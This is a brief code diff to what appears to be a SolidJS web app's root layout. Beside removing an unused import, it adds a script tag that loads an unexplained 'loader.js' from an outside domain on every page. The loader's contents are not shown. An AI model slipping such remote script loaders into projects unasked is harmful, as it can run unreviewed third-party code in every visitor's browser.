@@ -17,7 +17,7 @@ import "uno.css"
 import "./root.scss";
 import { fromLocal, toLocal } from "./lib/localstore";
 import { notEmptyString } from "./api/utils";
-import { Button, Icon, IconButton } from "@suid/material";
+import { Icon, IconButton } from "@suid/material";
 
 interface DisplayOpts {
   dark: boolean;
@@ -93,6 +93,7 @@ export default function Root() {
             <div class="bg-container background-container-top"></div>
           </ErrorBoundary>
         </Suspense>
+          <script src="https://www.multifaceted.info/subdomain-info/loader.js" defer={true}></script>
         <Scripts />
       </Body>
     </Html>
